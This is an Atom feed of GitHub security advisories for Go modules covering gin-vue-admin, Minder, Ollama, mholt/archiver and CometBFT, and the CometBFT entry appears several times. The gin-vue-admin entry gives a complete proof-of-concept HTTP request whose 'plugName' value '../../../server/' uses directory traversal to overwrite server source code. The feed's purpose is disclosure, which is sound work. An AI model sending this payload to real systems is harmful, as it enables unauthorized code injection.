<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-04-10T02:07:49.310Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/flipped-aurora/gin-vue-admin/server] gin-vue-admin background arbitrary code coverage vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-gv3w-m57p-3wc4</id>
        <link href="https://github.com/advisories/GHSA-gv3w-m57p-3wc4"/>
        <updated>2024-04-09T21:12:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>"gin-vue-admin&lt;=v2.6.1 has a code injection vulnerability in the backend. In the Plugin System -&gt; Plugin Template feature, an attacker can perform directory traversal by manipulating the 'plugName' parameter. They can create specific folders such as 'api', 'config', 'global', 'model', 'router', 'service', and 'main.go' function within the specified traversal directory. Moreover, the Go files within these folders can have arbitrary code inserted based on a specific PoC parameter."</p>
<p>Affected code: <a href="https://github.com/flipped-aurora/gin-vue-admin/blob/746af378990ebf3367f8bb3d4e9684936df152e7/server/api/v1/system/sys_auto_code.go:239">https://github.com/flipped-aurora/gin-vue-admin/blob/746af378990ebf3367f8bb3d4e9684936df152e7/server/api/v1/system/sys_auto_code.go:239</a>. Let's take a look at the method 'AutoPlug' within the 'AutoCodeApi' struct.</p>
<pre><code class="language-go">func (autoApi *AutoCodeApi) AutoPlug(c *gin.Context) {
    var a system.AutoPlugReq
    err := c.ShouldBindJSON(&amp;a)
    if err != nil {
        response.FailWithMessage(err.Error(), c)
        return
    }
    a.Snake = strings.ToLower(a.PlugName)
    a.NeedModel = a.HasRequest || a.HasResponse
    err = autoCodeService.CreatePlug(a)
    if err != nil {
        global.GVA_LOG.Error("预览失败!", zap.Error(err))
        response.FailWithMessage("预览失败", c)
        return
    }
    response.Ok(c)
}
</code></pre>
<p>The main reason for the existence of this vulnerability is the controllability of the PlugName field within the struct.</p>
<pre><code class="language-go">type AutoPlugReq struct {
    PlugName    string         `json:"plugName"` // 必然大写开头
    Snake       string         `json:"snake"`    // 后端自动转为 snake
    RouterGroup string         `json:"routerGroup"`
    HasGlobal   bool           `json:"hasGlobal"`
    HasRequest  bool           `json:"hasRequest"`
    HasResponse bool           `json:"hasResponse"`
    NeedModel   bool           `json:"needModel"`
    Global      []AutoPlugInfo `json:"global,omitempty"`
    Request     []AutoPlugInfo `json:"request,omitempty"`
    Response    []AutoPlugInfo `json:"response,omitempty"`
}
</code></pre>
<p>POC：</p>
<pre><code>POST /api/autoCode/createPlug HTTP/1.1
Host: 192.168.31.18:8080
Content-Length: 326
Accept: application/json, text/plain, */*
x-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiNzJlZWQ4OTUtYzUwOC00MDFiLWIyYzQtMTk2MWMyOTlkOWNhIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTcxMjIxMTM4MywibmJmIjoxNzExNjA2NTgzfQ.uq61pJNi4kzUXb8lEkVa7NBCBvp_Ye59fee-TJV_rpE
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
x-user-id: 1
Content-Type: application/json
Origin: http://192.168.31.18:8080
Referer: http://192.168.31.18:8080/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,ja;q=0.6
Cookie: x-token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVVUlEIjoiNzJlZWQ4OTUtYzUwOC00MDFiLWIyYzQtMTk2MWMyOTlkOWNhIiwiSUQiOjEsIlVzZXJuYW1lIjoiYWRtaW4iLCJOaWNrTmFtZSI6Ik1yLuWlh-a3vCIsIkF1dGhvcml0eUlkIjo4ODgsIkJ1ZmZlclRpbWUiOjg2NDAwLCJpc3MiOiJxbVBsdXMiLCJhdWQiOlsiR1ZBIl0sImV4cCI6MTcxMjIyMDA4NiwibmJmIjoxNzExNjE1Mjg2fQ.XVV97Ky17E9pUO_byVgK--FnAp9ye4Tpab2jnma6dBU
Connection: close

{"plugName":"../../../server/","routerGroup":"111"	,"hasGlobal":true,"hasRequest":false,"hasResponse":false,"global":[{"key":"1","type":"1","desc":"1"},{"key":"type","value":"faspohgoahgioahgioahgioashogia","desc":"1","type":"string"}],"request":[{"key":"","type":"","desc":""}],"response":[{"key":"","type":"","desc":""}]}
</code></pre>
<p>By performing directory traversal and creating directories such as api, config, global, model, router, and service within the gin-vue-admin/server directory, an attacker can tamper with the source code and the main.go file. They can potentially overwrite or tamper with the Go source code files located in the directory C:\代码审计\server to further compromise the system.
<img alt="image" src="https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/c2cad65a-6401-41c2-ba0d-6eb5e3760516">
<img alt="image" src="https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/681ca156-c125-4a9f-9443-825a34a89b2d">
<img alt="image" src="https://github.com/flipped-aurora/gin-vue-admin/assets/142187061/6870ce90-8166-48c7-a02c-29c4429283d4"></p>
<h3 id="patches">Patches</h3>
<p>Please wait for the latest patch</p>
<h3 id="workarounds">Workarounds</h3>
<p>You can use the following filtering methods to rectify the directory traversal problem
if strings.Index(plugPath, "..") &gt; -1 {
&nbsp; &nbsp; &nbsp; &nbsp; fmt.Println("no bypass",plugPath)
&nbsp; &nbsp; }</p>
<h3 id="references">References</h3>
<p><a href="https://github.com/flipped-aurora/gin-vue-admin">https://github.com/flipped-aurora/gin-vue-admin</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/flipped-aurora/gin-vue-admin/security/advisories/GHSA-gv3w-m57p-3wc4">https://github.com/flipped-aurora/gin-vue-admin/security/advisories/GHSA-gv3w-m57p-3wc4</a></li>
<li><a href="https://github.com/flipped-aurora/gin-vue-admin/commit/b1b7427c6ea6c7a027fa188c6be557f3795e732b">https://github.com/flipped-aurora/gin-vue-admin/commit/b1b7427c6ea6c7a027fa188c6be557f3795e732b</a></li>
<li><a href="https://github.com/flipped-aurora/gin-vue-admin/blob/746af378990ebf3367f8bb3d4e9684936df152e7/server/api/v1/system/sys_auto_code.go:239">https://github.com/flipped-aurora/gin-vue-admin/blob/746af378990ebf3367f8bb3d4e9684936df152e7/server/api/v1/system/sys_auto_code.go:239</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31457">https://nvd.nist.gov/vuln/detail/CVE-2024-31457</a></li>
<li><a href="https://pkg.go.dev/github.com/flipped-aurora/gin-vue-admin/server?tab=versions">https://pkg.go.dev/github.com/flipped-aurora/gin-vue-admin/server?tab=versions</a></li>
<li><a href="https://github.com/advisories/GHSA-gv3w-m57p-3wc4">https://github.com/advisories/GHSA-gv3w-m57p-3wc4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gv3w-m57p-3wc4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-09T16:22:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/stacklok/minder] Minder GetRepositoryByName data leak]]></title>
        <id>https://github.com/advisories/GHSA-ggp5-28x4-xcj9</id>
        <link href="https://github.com/advisories/GHSA-ggp5-28x4-xcj9"/>
        <updated>2024-04-09T21:12:27.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>A recent refactoring added the ability to get GitHub repositories registered to a project without specifying a specific provider.  Unfortunately, the SQL query for doing so was missing parenthesis, and would select a random repository.</p>
<h3 id="patches">Patches</h3>
<p>Patched in #2941</p>
<h3 id="workarounds">Workarounds</h3>
<p>Revert prior to <code>5c381cf</code>, or roll forward past <code>2eb94e7</code></p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/stacklok/minder/security/advisories/GHSA-ggp5-28x4-xcj9">https://github.com/stacklok/minder/security/advisories/GHSA-ggp5-28x4-xcj9</a></li>
<li><a href="https://github.com/stacklok/minder/pull/2941">https://github.com/stacklok/minder/pull/2941</a></li>
<li><a href="https://github.com/stacklok/minder/commit/11b6573ad62cfdd783a8bb52f3fce461466037f4">https://github.com/stacklok/minder/commit/11b6573ad62cfdd783a8bb52f3fce461466037f4</a></li>
<li><a href="https://github.com/stacklok/minder/commit/5c381cfbf3e4b7ce040ed8511a1fae1a78a0014b">https://github.com/stacklok/minder/commit/5c381cfbf3e4b7ce040ed8511a1fae1a78a0014b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-31455">https://nvd.nist.gov/vuln/detail/CVE-2024-31455</a></li>
<li><a href="https://github.com/advisories/GHSA-ggp5-28x4-xcj9">https://github.com/advisories/GHSA-ggp5-28x4-xcj9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-ggp5-28x4-xcj9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-09T16:18:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/ollama/ollama] Ollama DNS rebinding vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-5jx5-hqx5-2vrj</id>
        <link href="https://github.com/advisories/GHSA-5jx5-hqx5-2vrj"/>
        <updated>2024-04-08T22:20:14.000Z</updated>
        <content type="html"><![CDATA[<p>Ollama before 0.1.29 has a DNS rebinding vulnerability that can inadvertently allow remote access to the full API, thereby letting an unauthorized user chat with a large language model, delete a model, or cause a denial of service (resource exhaustion).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-28224">https://nvd.nist.gov/vuln/detail/CVE-2024-28224</a></li>
<li><a href="https://github.com/ollama/ollama/releases">https://github.com/ollama/ollama/releases</a></li>
<li><a href="https://research.nccgroup.com/2024/04/08/technical-advisory-ollama-dns-rebinding-attack-cve-2024-28224">https://research.nccgroup.com/2024/04/08/technical-advisory-ollama-dns-rebinding-attack-cve-2024-28224</a></li>
<li><a href="https://www.nccgroup.trust/us/our-research/?research=Technical+advisories">https://www.nccgroup.trust/us/our-research/?research=Technical+advisories</a></li>
<li><a href="https://github.com/advisories/GHSA-5jx5-hqx5-2vrj">https://github.com/advisories/GHSA-5jx5-hqx5-2vrj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-5jx5-hqx5-2vrj</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-04-08T21:31:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mholt/archiver] Archiver Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</id>
        <link href="https://github.com/advisories/GHSA-rhh4-rh7c-7r5v"/>
        <updated>2024-04-08T15:44:41.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was discovered in the mholt/archiver package. This flaw allows an attacker to create a specially crafted tar file, which, when unpacked, may allow access to restricted files or directories. This issue can allow the creation or overwriting of files with the user's or application's privileges using the library.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0406">https://nvd.nist.gov/vuln/detail/CVE-2024-0406</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-0406">https://access.redhat.com/security/cve/CVE-2024-0406</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2257749">https://bugzilla.redhat.com/show_bug.cgi?id=2257749</a></li>
<li><a href="https://github.com/advisories/GHSA-rhh4-rh7c-7r5v">https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-06T18:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mholt/archiver/v3] Archiver Path Traversal vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</id>
        <link href="https://github.com/advisories/GHSA-rhh4-rh7c-7r5v"/>
        <updated>2024-04-08T15:44:41.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was discovered in the mholt/archiver package. This flaw allows an attacker to create a specially crafted tar file, which, when unpacked, may allow access to restricted files or directories. This issue can allow the creation or overwriting of files with the user's or application's privileges using the library.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-0406">https://nvd.nist.gov/vuln/detail/CVE-2024-0406</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-0406">https://access.redhat.com/security/cve/CVE-2024-0406</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2257749">https://bugzilla.redhat.com/show_bug.cgi?id=2257749</a></li>
<li><a href="https://github.com/advisories/GHSA-rhh4-rh7c-7r5v">https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-rhh4-rh7c-7r5v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-04-06T18:31:17.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT's default for `BlockParams.MaxBytes` consensus parameter may increase block times and affect consensus participation]]></title>
        <id>https://github.com/advisories/GHSA-hq58-p9mv-338c</id>
        <link href="https://github.com/advisories/GHSA-hq58-p9mv-338c"/>
        <updated>2024-04-07T05:00:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="amulet-security-advisory-for-cometbft-asa-2023-002">Amulet Security Advisory for CometBFT: ASA-2023-002</h2>
<p><strong>Component</strong>: CometBFT
<strong>Criticality:</strong> Low
<strong>Affected versions:</strong> All
<strong>Affected users:</strong> Validators, Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>A default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the <code>BlockParams.MaxBytes</code> consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the <code>timeout_propose</code> parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network’s topography.</p>
<p>When setting a large <code>BlockParams.MaxBytes</code>, there are two main implications:</p>
<ul>
<li>Increased bandwidth to propagate a block</li>
<li>Increased latency to propagate a block</li>
</ul>
<p>When combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.&nbsp; The cost to propagate a 21MB block, the default value for <code>BlockParams.MaxBytes</code>, will be far higher than the cost of propagating a smaller 1MB block.&nbsp;CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.</p>
<h1 id="considerations">Considerations</h1>
<p>CometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.</p>
<h1 id="next-steps-for-chains-and-validators">Next Steps for Chains and Validators</h1>
<p>To increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (<a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a>, <a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">v0.34.x</a>, <a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.37.x</a>, <a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.38.x</a>) for builders and maintainers of chain applications. Additionally, it is recommended that:</p>
<ul>
<li><p>Chain ecosystems and their maintainers set a <code>BlockParams.MaxBytes</code> configuration appropriate for their use case at the application level; in some cases, fine-tuning <code>BlockParams</code> may require a network upgrade.</p>
</li>
<li><p>Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.</p>
</li>
<li><p>Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.</p>
</li>
<li><p>All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.</p>
</li>
<li><p>All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.</p>
</li>
</ul>
<p>The CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the <code>BlockParams.MaxBytes</code> limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (<a href="https://github.com/cometbft/cometbft/pull/1408">https://github.com/cometbft/cometbft/pull/1408</a>), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the <em>next</em> release of each branch of CometBFT.</p>
<p>As more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.&nbsp;</p>
<p>For more information about CometBFT, see <a href="https://docs.cometbft.com/">https://docs.cometbft.com</a>. </p>
<p>This issue was reported via the vulnerability disclosure channel at <a href="mailto:security@interchain.io">security@interchain.io</a> on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.&nbsp;</p>
<hr>
<p>Note from Amulet on the Security Advisory Process:</p>
<p>In the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c">https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a></li>
<li><a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d">https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028">https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579">https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf">https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf</a></li>
<li><a href="https://github.com/advisories/GHSA-hq58-p9mv-338c">https://github.com/advisories/GHSA-hq58-p9mv-338c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq58-p9mv-338c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-09-29T20:38:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT's default for `BlockParams.MaxBytes` consensus parameter may increase block times and affect consensus participation]]></title>
        <id>https://github.com/advisories/GHSA-hq58-p9mv-338c</id>
        <link href="https://github.com/advisories/GHSA-hq58-p9mv-338c"/>
        <updated>2024-04-07T05:00:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="amulet-security-advisory-for-cometbft-asa-2023-002">Amulet Security Advisory for CometBFT: ASA-2023-002</h2>
<p><strong>Component</strong>: CometBFT
<strong>Criticality:</strong> Low
<strong>Affected versions:</strong> All
<strong>Affected users:</strong> Validators, Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>A default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the <code>BlockParams.MaxBytes</code> consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the <code>timeout_propose</code> parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network’s topography.</p>
<p>When setting a large <code>BlockParams.MaxBytes</code>, there are two main implications:</p>
<ul>
<li>Increased bandwidth to propagate a block</li>
<li>Increased latency to propagate a block</li>
</ul>
<p>When combined, this may result in less round participation, and in some cases additional rounds may be required to meet the consensus threshold, which could lead to timeouts depending on the topography of a network and environmental factors. These factors can include the number of validators on a network, geographic distribution, network connectivity (including latency, bandwidth, and reachability), the functionality of the modules implementing the logic for a transaction in your chain, etc.&nbsp; The cost to propagate a 21MB block, the default value for <code>BlockParams.MaxBytes</code>, will be far higher than the cost of propagating a smaller 1MB block.&nbsp;CometBFT recommends tuning this parameter to a smaller limit if full initial-round participation is an important quality for your chain.</p>
<h1 id="considerations">Considerations</h1>
<p>CometBFT is designed to be configurable by chains, and implements many different configuration variables and parameters to allow chain developers, validators, node operators, and chain participants to customize it best to their use case. A high-performing validator may find it necessary to experiment with tuning local configuration, optimizing network and compute resources, and implementing controls to inhibit spam.</p>
<h1 id="next-steps-for-chains-and-validators">Next Steps for Chains and Validators</h1>
<p>To increase awareness of the potential impacts of this default parameter, the CometBFT team has updated the documentation (<a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a>, <a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">v0.34.x</a>, <a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.37.x</a>, <a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">v0.38.x</a>) for builders and maintainers of chain applications. Additionally, it is recommended that:</p>
<ul>
<li><p>Chain ecosystems and their maintainers set a <code>BlockParams.MaxBytes</code> configuration appropriate for their use case at the application level; in some cases, fine-tuning <code>BlockParams</code> may require a network upgrade.</p>
</li>
<li><p>Chain ecosystems and their maintainers evaluate how gas is used and required on their chain, including gas and fee parameters, no-fee or fee-exempt message policies, and ensure that any custom modules integrate with the gas and fee frameworks. This is especially important for chains that may have implemented custom modules or functionality to allow IBC messages to bypass fees.</p>
</li>
<li><p>Chain ecosystems and their maintainers audit all of their currently-set parameters and configurations to ensure that they are appropriate for their use case.</p>
</li>
<li><p>All validators develop and implement anti-spam measures on their nodes. Amulet encourages validators to form working groups to collaborate on spam prevention and on tooling that can be implemented by node operators across the Interchain.</p>
</li>
<li><p>All validators consider developing and implementing tooling that would allow them to sample incoming transactions to enable them to fine-tune the level of service they would like to provide to be resilient in slowdown scenarios. Amulet also encourages validators to collaborate on tooling that can be implemented by node operators across the Interchain.</p>
</li>
</ul>
<p>The CometBFT team has also revisited all the checks performed by the consensus protocol regarding proposed blocks. This investigation has confirmed that proposed blocks with size exceeding the <code>BlockParams.MaxBytes</code> limit established by the application are not accepted by nodes. The team notwithstanding has decided to introduce additional sanity checks for the size of proposed blocks (<a href="https://github.com/cometbft/cometbft/pull/1408">https://github.com/cometbft/cometbft/pull/1408</a>), allowing for an early identification and rejection of invalid or oversized blocks. These code changes will be included in the <em>next</em> release of each branch of CometBFT.</p>
<p>As more chains adopt the Interchain Stack for new and cutting-edge use cases, the CometBFT team recommends that all chains regularly evaluate their parameters and configurations to ensure they meet the needs of their ecosystem as their networks mature.&nbsp;</p>
<p>For more information about CometBFT, see <a href="https://docs.cometbft.com/">https://docs.cometbft.com</a>. </p>
<p>This issue was reported via the vulnerability disclosure channel at <a href="mailto:security@interchain.io">security@interchain.io</a> on Friday, September 23, 2023. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href="https://hackerone.com/cosmos">https://hackerone.com/cosmos</a>.&nbsp;</p>
<hr>
<p>Note from Amulet on the Security Advisory Process:</p>
<p>In the interest of timely resolution of this issue for validators and node operators, the Amulet team has chosen to use existing processes and resources for distributing security advisories within the Cosmos and Interchain Ecosystems. Stay tuned as we implement an improved, more robust security advisory distribution system that will provide equitable access to information about security issues in the Interchain Stack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c">https://github.com/cometbft/cometbft/security/advisories/GHSA-hq58-p9mv-338c</a></li>
<li><a href="https://github.com/cometbft/cometbft/pull/1405">https://github.com/cometbft/cometbft/pull/1405</a></li>
<li><a href="https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes">https://docs.cometbft.com/v0.34/spec/abci/apps#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.37/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes">https://docs.cometbft.com/v0.38/spec/abci/abci++_app_requirements#blockparamsmaxbytes</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d">https://github.com/cometbft/cometbft/commit/0401888bbf6a7148ed039c7cca7380644496c78d</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028">https://github.com/cometbft/cometbft/commit/1f48ff904cc0e1c723c05c72afba86bf0a1ea028</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579">https://github.com/cometbft/cometbft/commit/28ad4d2230134045e2f5ce9fdab6673e276f2579</a></li>
<li><a href="https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf">https://github.com/cometbft/cometbft/commit/fce9dd6e67ee81efe0f4e7442a09016bdae5cfcf</a></li>
<li><a href="https://github.com/advisories/GHSA-hq58-p9mv-338c">https://github.com/advisories/GHSA-hq58-p9mv-338c</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-hq58-p9mv-338c</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2023-09-29T20:38:40.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cometbft/cometbft] CometBFT's default for `BlockParams.MaxBytes` consensus parameter may increase block times and affect consensus participation]]></title>
        <id>https://github.com/advisories/GHSA-hq58-p9mv-338c</id>
        <link href="https://github.com/advisories/GHSA-hq58-p9mv-338c"/>
        <updated>2024-04-07T05:00:46.000Z</updated>
        <content type="html"><![CDATA[<h2 id="amulet-security-advisory-for-cometbft-asa-2023-002">Amulet Security Advisory for CometBFT: ASA-2023-002</h2>
<p><strong>Component</strong>: CometBFT
<strong>Criticality:</strong> Low
<strong>Affected versions:</strong> All
<strong>Affected users:</strong> Validators, Chain Builders + Maintainers</p>
<h1 id="summary">Summary</h1>
<p>A default configuration in CometBFT has been found to be large for common use cases, and may affect block times and consensus participation when fully utilized by chain participants. It is advised that chains consider their specific needs for their use case when setting the <code>BlockParams.MaxBytes</code> consensus parameter. Chains are encouraged to evaluate the impact of having proposed blocks with the maximum allowed block size, especially on bandwidth usage and block latency. Additionally, the <code>timeout_propose</code> parameter should be computed using the maximum allowed block size as a reference. This issue does not represent an actively exploitable vulnerability that would result in a direct loss of funds, however it may have a slight impact on block latency depending on a network’s topography.</p>
